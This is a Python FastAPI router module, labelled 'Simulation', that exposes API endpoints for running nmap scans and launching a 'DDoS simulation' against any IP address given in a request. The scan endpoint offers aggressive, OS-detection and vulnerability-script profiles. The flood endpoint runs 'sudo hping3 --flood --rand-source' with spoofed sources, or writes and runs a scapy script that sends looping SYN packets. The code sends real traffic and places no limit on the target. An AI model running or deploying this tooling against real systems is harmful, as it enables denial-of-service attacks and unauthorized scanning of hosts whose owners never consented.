import asyncio
import subprocess
import atexit
import structlog
from fastapi import APIRouter, HTTPException
from typing import Dict, Any, Optional
from pathlib import Path

logger = structlog.get_logger("simulation")
router = APIRouter(prefix="/api/simulation", tags=["Simulation"])
_spawned_processes = set()


def _track_process(process: subprocess.Popen):
    _spawned_processes.add(process)
    return process


def _cleanup_spawned_processes():
    for process in list(_spawned_processes):
        try:
            if process.poll() is None:
                process.terminate()
        except Exception:
            pass


atexit.register(_cleanup_spawned_processes)

@router.post("/nmap/scan")
async def run_nmap_scan(request: Dict[str, Any]):
    """
    Runs an Nmap scan against a target.
    Requires nmap to be installed on the host.
    """
    target = request.get("target")
    profile = request.get("profile", "quick")
    
    if not target:
        raise HTTPException(status_code=400, detail="Target IP required")
    
    logger.info("Nmap scan requested", target=target, profile=profile)
    
    # Map profiles to nmap flags
    profiles = {
        "quick": ["-F", "--open"],
        "ping": ["-sn"],
        "service": ["-sV", "--version-intensity", "0"],
        "os_detect": ["-O", "--osscan-limit"],
        "aggressive": ["-A", "-T4"],
        "vuln": ["--script", "vuln"]
    }
    
    flags = profiles.get(profile, ["-F"])
    command = ["nmap"] + flags + [target]
    
    try:
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
        except asyncio.TimeoutError:
            process.kill()
            await process.communicate()
            return {"success": False, "error": "Nmap scan timed out after 60 seconds"}
        
        if process.returncode == 0:
            return {
                "success": True, 
                "raw_output": stdout.decode(),
                "target": target,
                "profile": profile
            }
        else:
            return {
                "success": False, 
                "error": stderr.decode() or "Nmap execution failed",
                "raw_output": stdout.decode()
            }
    except Exception as e:
        logger.error("Nmap subprocess failed", error=str(e))
        return {"success": False, "error": str(e)}

@router.post("/attack/ddos")
async def simulate_ddos(request: Dict[str, Any]):
    """
    Simulates a DDoS flood attack using hping3 or a scapy script.
    """
    target = request.get("target")
    if not target:
        raise HTTPException(status_code=400, detail="Target IP required")
    
    logger.warning("DDoS Simulation started", target=target)
    
    # We'll use a simple scapy script to avoid external dependencies like hping3
    # but we'll try hping3 first if available as it's faster.
    
    try:
        # Check if hping3 is available
        hping_check = subprocess.run(["which", "hping3"], capture_output=True, timeout=10)
        if hping_check.returncode == 0:
            # Run hping3 for 5 seconds
            # -S (SYN), -p 80, --flood
            cmd = ["sudo", "hping3", "-S", "-p", "80", "--flood", "--rand-source", "-c", "5000", target]
            _track_process(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            return {"success": True, "message": f"DDoS Flood (SYN) started against {target} (5000 packets)"}
        else:
            # Fallback to a small scapy-based flood in a separate process
            project_root = Path(__file__).resolve().parents[3]
            script_path = project_root / "scripts" / "sim_flood.py"
            
            # Create the script if it doesn't exist
            if not script_path.exists():
                script_content = f"""
import sys
from scapy.all import IP, TCP, send
target = sys.argv[1]
print(f"Flooding {{target}}...")
pkt = IP(dst=target)/TCP(dport=80, flags="S")
send(pkt, loop=1, count=1000, verbose=0)
"""
                with open(script_path, "w") as f:
                    f.write(script_content)
            
            _track_process(subprocess.Popen(["python3", str(script_path), target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            return {"success": True, "message": f"DDoS Simulation (Scapy) started against {target}"}
            
    except Exception as e:
        logger.error("DDoS simulation failed", error=str(e))
        return {"success": False, "error": str(e)}
